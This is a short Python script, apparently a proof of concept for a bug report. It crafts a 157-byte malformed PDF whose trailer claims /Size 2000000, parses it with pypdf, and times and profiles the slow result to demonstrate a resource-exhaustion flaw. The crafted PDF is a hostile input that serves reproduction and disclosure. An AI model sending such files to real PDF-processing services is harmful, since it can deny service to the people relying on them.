import io, time, logging, cProfile, pstats
logging.disable(logging.CRITICAL)
from pypdf import PdfReader

# 157-byte PDF, no valid /Root, trailer advertises /Size 2000000
data = (b"%PDF-1.4\n1 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
        b"xref\n0 2\n0000000000 65535 f \n0000000009 00000 n \n"
        b"trailer\n<< /Size 2000000 >>\nstartxref\n61\n%%EOF\n")
r = PdfReader(io.BytesIO(data))
pr = cProfile.Profile(); pr.enable()
t = time.perf_counter()
try:
    r.pages
except Exception as e:
    print("exc:", type(e).__name__)
print(f"{len(data)}-byte file, /Size 2000000: {time.perf_counter()-t:.2f}s")
pr.disable()
pstats.Stats(pr).sort_stats("tottime").print_stats(6)
